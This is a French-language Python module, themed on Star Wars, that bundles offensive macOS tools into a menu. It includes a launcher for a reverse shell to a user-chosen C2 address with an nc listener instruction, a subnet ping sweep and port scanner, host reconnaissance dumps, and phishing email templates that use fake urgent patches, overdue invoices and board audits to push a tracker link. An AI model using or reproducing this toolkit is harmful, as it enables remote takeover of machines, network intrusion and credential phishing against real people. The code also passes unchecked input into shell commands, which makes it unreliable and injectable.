# modules/force.py - 8 tools du systeme galactique
import os, subprocess, hashlib, time, random

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "sorties")
os.makedirs(OUT, exist_ok=True)

def ask(label): return input(f"  {label} : ").strip()
def r(cmd): subprocess.run(cmd, shell=True)

def holocron():
    """archive totale de la machine : materiel, reseaux, utilisateurs, services"""
    stamp = time.strftime("%Y%m%d_%H%M%S")
    p = os.path.join(OUT, f"holocron_{stamp}.txt")
    sections = [
        ("MATERIEL", "system_profiler SPHardwareDataType | head -20"),
        ("RESEAU", "ifconfig | grep -E 'inet |ether' | head -10"),
        ("UTILISATEURS", "dscl . -list /Users | grep -v '^_' | head -15"),
        ("SERVICES", "launchctl list | head -20"),
        ("DISK", "df -h | head -6"),
    ]
    with open(p, "w") as f:
        for title, cmd in sections:
            f.write(f"\n=== {title} ===\n")
            f.write(subprocess.run(cmd, shell=True, capture_output=True).stdout.decode())
    print(f"  [OK] holocron archive : {p}")
    r(f"open '{p}'")

def sith_infiltrator():
    """l'infiltrateur : reverse shell vers le C2 de ton choix"""
    print("  lance d'abord le cote obscur : nc -lvn 4444")
    ip = ask("C2 ip") or "127.0.0.1"
    print(f"  agent disponible dans RickPortal build : 02_reverse_shell {ip} 4444")
    c = ask("lancer maintenant ? (o/N)").lower()
    if c == "o":
        r(f"$HOME/Desktop/RickPortal/build/mac/02_reverse_shell {ip} 4444 & echo '  [OBScur] agent parti vers {ip}:4444'")

def force_choke():
    """etrangle un processus par le reseau : throttle avec throttle si present sinon pause/resume"""
    print("  processus gourmands :")
    r("ps -arcwwwxo pid,pcpu,comm | head -8")
    pid = ask("PID a etouffer (SIGSTOP = pause totale)")
    subprocess.run(f"kill -STOP {pid}", shell=True)
    print(f"  [FORCE CHOKE] {pid} fige. entree pour le relacher...")
    input()
    subprocess.run(f"kill -CONT {pid}", shell=True)
    print(f"  relache.")

def droid_sweep():
    """les droids balayent le reseau : vivants + ports cles"""
    prefix = ask("prefixe (192.168.1.)")
    import concurrent.futures
    def ping(i):
        rc = subprocess.run(f"ping -c 1 -W 400 {prefix}{i}", shell=True, stdout=subprocess.DEVNULL).returncode
        return prefix + str(i) if rc == 0 else None
    with concurrent.futures.ThreadPoolExecutor(50) as ex:
        alive = [h for h in ex.map(ping, range(1, 255)) if h]
    print(f"  {len(alive)} signatures detectees")
    for h in alive:
        for port in [22, 80, 443, 445, 3389]:
            rc = subprocess.run(f"nc -z -G 1 {h} {port}", shell=True,
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode
            if rc == 0: print(f"   {h:<16} port {port} OUVERT")

def death_star_targeting():
    """ ciblage de precision : un port, un host, verrouille"""
    h = ask("host"); p = ask("port")
    for i in range(3):
        rc = subprocess.run(f"nc -z -G 2 {h} {p}", shell=True,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode
        print(f"   tir {i+1} : {'CIBLE VERROUILLEE - port ouvert' if rc == 0 else 'ferme'}")
        time.sleep(0.4)

def jedi_mind_trick():
    """les pretextes : l'esprit influence les esprits"""
    target = ask("profil de la cible (IT/comptable/direction)") or "IT"
    tpl = {
        "IT": "OBJET : CVE critique - patcher des ce soir\n\nUn zero-day touche notre flotte. Applique le correctif depuis le portail interne AVANT 18h : {lien}\n(sinon le SOC isolera ta machine a la next scan.)",
        "comptable": "OBJET : Facture en retard - penalites\n\nFacture #48291 impayee depuis 30 j. Consulte le document joint via le portail securise : {lien}\n(60 EUR de penalite apres demain.)",
        "direction": "OBJET : Audit surprise du conseil\n\nLe conseil exige un audit express. Remplis le formulaire officiel avant la reunion : {lien}\n(C'est confidentiel - ne pas faire suivre.)",
    }[target].format(lien="http://TON_TRACKER:8082/")
    p = os.path.join(OUT, "jedi_trick.txt")
    open(p, "w").write(tpl)
    print(tpl)
    print(f"\n  [OK] {p} - branche ton tracker (Cyborg webhook) sur {p.rsplit('/', 1)[-1]}")

def kyber_crystal():
    """le cristal : derive de cles AES a partir d'une phrase de passe"""
    pw = ask("phrase de passe").encode()
    for name, salt in [("chiffrement", b"kyber1"), ("signature", b"kyber2"), ("transport", b"kyber3")]:
        k = hashlib.pbkdf2_hmac("sha256", pw, salt, 100000)
        print(f"  {name:<12} : {k.hex()[:32]}...")
    print("  [OK] trois cristaux derives - meme phrase, cles distinctes")

def blaster_deflect():
    """le bouclier : pf firewall - regles de blocage rapides (lab)"""
    print("  regles pf actives (extrait) :")
    r("sudo pfctl -sr 2>/dev/null | head -10 || echo '  (sudo requis pour lire la table pf)'")
    print("\n  pour bloquer une IP de lab : sudo pfctl -d 2>/dev/null; echo 'regle bloque X: block drop from <ip> to any' | sudo pfctl -f -")

TOOLS = [
    ("HOLOCRON",            "archive totale de la machine",               holocron),
    ("SITH INFILTRATOR",    "reverse shell vers le cote obscur",          sith_infiltrator),
    ("FORCE CHOKE",         "figer un processus (reversible)",            force_choke),
    ("DROID SWEEP",         "balayage reseau + ports cles",               droid_sweep),
    ("DEATH STAR TARGETING","ciblage de precision d'un port",             death_star_targeting),
    ("JEDI MIND TRICK",     "pretextes de campagne (lab)",                jedi_mind_trick),
    ("KYBER CRYSTAL",       "derivation de cles AES",                     kyber_crystal),
    ("BLASTER DEFLECT",     "regles de firewall pf",                      blaster_deflect),
]
